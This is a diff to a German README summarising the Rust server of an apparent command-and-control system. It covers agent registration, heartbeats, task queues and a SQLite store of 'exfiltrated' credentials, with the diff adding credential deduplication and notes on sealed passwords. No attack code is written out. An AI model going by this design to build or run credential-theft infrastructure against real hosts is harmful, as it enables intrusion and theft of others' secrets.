@@ -47,12 +47,13 @@ Rollup aus [`src/`](./src/README.md):
   [src/main.rs:register], `HeartbeatRequest` [src/main.rs:heartbeat], `SecretUpload`
   [src/main.rs:upload_secret]; Antwort-Typen `c2::Host` [src/main.rs:list_hosts],
   `c2::ExfiltratedSecret` [src/main.rs:list_secrets], `c2::Task` [src/main.rs:list_tasks].
-- `pub struct Db` mit `open`, `upsert_host`, `list_hosts`, `insert_secret`, `list_secrets`,
+- `pub struct Db` mit `open`, `upsert_host`, `list_hosts`, `upsert_secret`, `list_secrets`,
   `insert_task`, `update_task_result`, `list_tasks`; Datenmodelle `HostRow`, `SecretRow`, `TaskRow`
   [src/db.rs:Db] [src/db.rs:Db::open] [src/db.rs:HostRow] [src/db.rs:SecretRow]
   [src/db.rs:TaskRow].
-- SQL-Tabellen `hosts`, `secrets`, `tasks` — jeweils `id TEXT PRIMARY KEY`
-  [src/db.rs:Db::open].
+- SQL-Tabellen `hosts`, `secrets`, `tasks` — jeweils `id TEXT PRIMARY KEY`; `secrets`
+  zusätzlich mit dem UNIQUE-Index `idx_secrets_identitaet` auf `(host_id, cred_type,
+  username, source)` [src/db.rs:Db::open] [src/db.rs:Db::migriere_secrets].
 - `pub fn verify(parts, expected) -> bool`, `pub fn verify_token(candidate, expected) -> bool`
   und die Middleware `pub async fn require_auth(req, next) -> Response`
   [src/auth.rs:verify] [src/auth.rs:verify_token] [src/auth.rs:require_auth].
@@ -76,6 +77,14 @@ Rollup aus [`src/`](./src/README.md):
   [src/main.rs:register] [src/main.rs:upload_secret].
 - `upsert_host` nutzt `ON CONFLICT(id) DO UPDATE SET last_seen, os, status` — bei Konflikt
   bleiben `ip`, `hostname` und `first_seen` unverändert [src/db.rs:Db::upsert_host].
+- `upsert_secret` nutzt `ON CONFLICT(host_id, cred_type, username, source) DO UPDATE SET
+  collected_at, password, sealed_password` — die fachliche Identitaet eines Secrets ist
+  `(host_id, cred_type, username, source)`. Ein wiederholter Upload aktualisiert die
+  bekannte Zeile, statt eine zweite anzulegen; die `id` der Zeile bleibt dabei stehen
+  [src/db.rs:Db::upsert_secret].
+- Der Upsert überschreibt auch `sealed_password`: der Agent kapselt pro Lauf einen neuen
+  Master-Key, deshalb ist nur der Chiffretext des jüngsten Laufs mit dem aktuellen
+  Host-Schlüssel entschlüsselbar [src/db.rs:Db::upsert_secret].
 - Die Zeilentypen tragen keine serde-Derives und werden per Positionsindex gelesen; die
   Umwandlung in die Wire-Typen passiert über `From<HostRow> for c2::Host`,
   `From<SecretRow> for c2::ExfiltratedSecret` und `From<TaskRow> for c2::Task`, wobei nur
@@ -85,6 +94,9 @@ Rollup aus [`src/`](./src/README.md):
   [src/db.rs:Db].
 - `list_hosts`, `list_secrets` und `list_tasks` verwenden `SELECT` ohne `ORDER BY` — die
   Zeilenreihenfolge ist nicht spezifiziert [src/db.rs:Db::list_hosts].
+- Die nachgezogenen Spalten `sealed_master` und `sealed_password` werden als `Option<String>`
+  gelesen und fallen auf `""` zurück — `ALTER TABLE ADD COLUMN` trägt in den Altzeilen NULL
+  nach [src/db.rs:Db::list_host_rows] [src/db.rs:Db::list_secret_rows].
 - `Db::insert_task` wird vom Handler `create_task` aufgerufen — die Tabelle `tasks` hat
   damit einen Schreibpfad; `GET /api/tasks` liefert angelegte Tasks
   [src/db.rs:Db::insert_task] [src/main.rs:create_task].
@@ -98,9 +110,13 @@ Rollup aus [`src/`](./src/README.md):
 - Dateisystem: `Connection::open` legt die SQLite-Datenbankdatei unter dem `--db`-Pfad
   an; das DDL `CREATE TABLE IF NOT EXISTS` für `hosts`, `secrets` und `tasks` wird per
   `execute_batch` ausgeführt [src/db.rs:Db::open].
-- SQL-DML: `INSERT INTO hosts ... ON CONFLICT`, `INSERT INTO secrets`, `INSERT INTO tasks`
-  sowie die drei `SELECT`-Abfragen [src/db.rs:Db::upsert_host]
-  [src/db.rs:Db::insert_secret] [src/db.rs:Db::insert_task].
+- SQL-DML: `INSERT INTO hosts ... ON CONFLICT`, `INSERT INTO secrets ... ON CONFLICT`,
+  `INSERT INTO tasks` sowie die drei `SELECT`-Abfragen [src/db.rs:Db::upsert_host]
+  [src/db.rs:Db::upsert_secret] [src/db.rs:Db::insert_task].
+- Schema-Migration der `secrets`-Tabelle: erst werden Duplikate entfernt (`MAX(rowid)`
+  je Gruppe behält die jüngste Zeile), dann wird der UNIQUE-Index
+  `idx_secrets_identitaet` angelegt. Beide Schritte sind idempotent
+  [src/db.rs:Db::migriere_secrets].
 - Prozesszustand: `std::env::set_var("KX_SERVER_TOKEN", &token)` setzt die
   Umgebungsvariable unbedingt [src/main.rs:main].
 - Schreibt das effektive Bearer-Token im Klartext nach stderr, wenn kein Token vorgegeben
@@ -116,5 +132,6 @@ Rollup aus [`src/`](./src/README.md):
 ## Verification
 
 - Run: `cargo test` (ausgeführt in `/Volumes/T7/Projekte/testwurm/kx`)
-- Stand: `cargo test --workspace` läuft grün — 130 Tests, 0 Fehler, davon 19 aus diesem
-  Crate (`db.rs`, `main.rs`, `dashboard.rs`, `e2e_test.rs`).
+- Stand: `cargo test --workspace` läuft grün — 0 Fehler, davon 25 aus diesem Crate
+  (`db.rs`, `main.rs`, `dashboard.rs`, `e2e_test.rs`); die Gesamtzahl nennt das
+  Repository-README.
